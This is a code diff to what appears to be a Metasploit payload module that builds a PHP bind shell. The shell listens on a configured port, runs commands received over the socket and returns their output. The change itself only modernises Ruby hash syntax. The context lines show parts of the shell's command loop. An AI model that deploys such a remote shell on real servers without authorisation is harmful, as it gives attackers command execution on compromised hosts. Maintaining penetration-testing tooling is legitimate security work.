@@ -43,7 +43,7 @@ module Metasploit3
 
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
     shell = <<-END_OF_PHP_CODE
-    #{php_preamble({:disabled_varname => dis})}
+    #{php_preamble({disabled_varname: dis})}
     $port=#{datastore['LPORT']};
 
     $scl='socket_create_listen';
@@ -67,7 +67,7 @@ module Metasploit3
       } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
         break;
       }else{
-        #{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
+        #{php_system_block({cmd_varname:"$c", output_varname:"$o", disabled_varname: dis})}
       }
       @socket_write($msgsock,$o,strlen($o));
     }
